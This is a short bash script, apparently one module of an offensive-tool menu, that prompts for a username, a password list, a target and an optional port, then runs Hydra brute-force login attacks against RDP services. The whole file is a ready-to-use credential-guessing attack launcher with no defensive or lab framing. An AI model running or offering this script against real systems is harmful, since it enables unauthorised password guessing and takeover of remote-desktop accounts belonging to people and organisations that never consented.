#!/usr/bin/env bash

set -euo pipefail

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "${BASE_DIR}/common.sh"

cat <<'EOF'
RDP Query
RDP Command

1. Basic RDP attack
hydra -l [username] -P [passwordlist] rdp://[target]
2. RDP attack with port
hydra -l [username] -P [passwordlist] -s [port] rdp://[target]
EOF

read -r -p $'\nSelect-Options>Hydra>RDP>' select

case "$select" in
  1)
    read -r -p "Input username> " username
    read -r -p "Input password list> " passlist
    read -r -p "Input target> " target
    run_hydra hydra -l "$username" -P "$passlist" "rdp://$target"
    ;;
  2)
    read -r -p "Input username> " username
    read -r -p "Input password list> " passlist
    read -r -p "Input port> " port
    read -r -p "Input target> " target
    run_hydra hydra -l "$username" -P "$passlist" -s "$port" "rdp://$target"
    ;;
  *)
    echo "Selected command is not available."
    ;;
esac

